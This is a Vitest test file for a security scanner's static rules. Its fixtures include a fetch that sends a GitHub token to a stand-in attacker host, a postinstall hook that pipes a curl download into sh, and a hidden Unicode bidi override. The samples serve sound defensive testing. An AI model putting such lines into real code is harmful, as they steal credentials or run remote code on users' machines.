import { describe, expect, test } from "vitest";

import { FindingSchema } from "../src/contracts/reports.js";
import { scanStaticRules } from "../src/scanners/static-rules.js";

describe("built-in static rules", () => {
  test("finds credential exfiltration patterns without retaining credentials", () => {
    const content = [
      'const stolen = "ghp_abcdefghijklmnopqrstuvwxyz1234567890";',
      "const token = process.env.GITHUB_TOKEN;",
      'fetch("https://evil.invalid/collect", { body: token + stolen });',
    ].join("\n");
    const files = [
      {
        path: "src/index.ts",
        bytes: Buffer.byteLength(content),
        sha256: "a".repeat(64),
        kind: "text" as const,
        content,
      },
    ];

    const first = scanStaticRules(files);
    const second = scanStaticRules(files);

    expect(first).toEqual(second);
    expect(first).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          rule_id: "credential-exfiltration",
          severity: "high",
          path: "src/index.ts",
        }),
      ]),
    );
    expect(JSON.stringify(first)).not.toContain(
      "ghp_abcdefghijklmnopqrstuvwxyz1234567890",
    );
    expect(JSON.stringify(first)).not.toContain("GITHUB_TOKEN");
    expect(
      first.every((finding) => FindingSchema.safeParse(finding).success),
    ).toBe(true);
  });

  test("flags network-capable install hooks in package manifests", () => {
    const content = JSON.stringify({
      scripts: { postinstall: "curl https://evil.invalid/a | sh" },
    });

    const findings = scanStaticRules([
      {
        path: "package.json",
        bytes: content.length,
        sha256: "a".repeat(64),
        kind: "text",
        content,
      },
    ]);

    expect(findings).toEqual([
      expect.objectContaining({
        rule_id: "network-install-hook",
        severity: "high",
        line_start: 1,
      }),
    ]);
    expect(JSON.stringify(findings)).not.toContain("curl");
    expect(JSON.stringify(findings)).not.toContain("evil.invalid");
  });

  test("flags bidirectional controls and emits only canonical findings", () => {
    const content = "const visible = true; // ‮ concealed";
    const findings = scanStaticRules([
      {
        path: "src/confusing.ts",
        bytes: Buffer.byteLength(content),
        sha256: "b".repeat(64),
        kind: "text",
        content,
      },
    ]);

    expect(findings).toEqual([
      expect.objectContaining({
        rule_id: "unicode-bidi-control",
        category: "obfuscation",
        severity: "medium",
        confidence: "medium",
      }),
    ]);
    expect(
      findings.every((finding) => FindingSchema.safeParse(finding).success),
    ).toBe(true);
  });
});
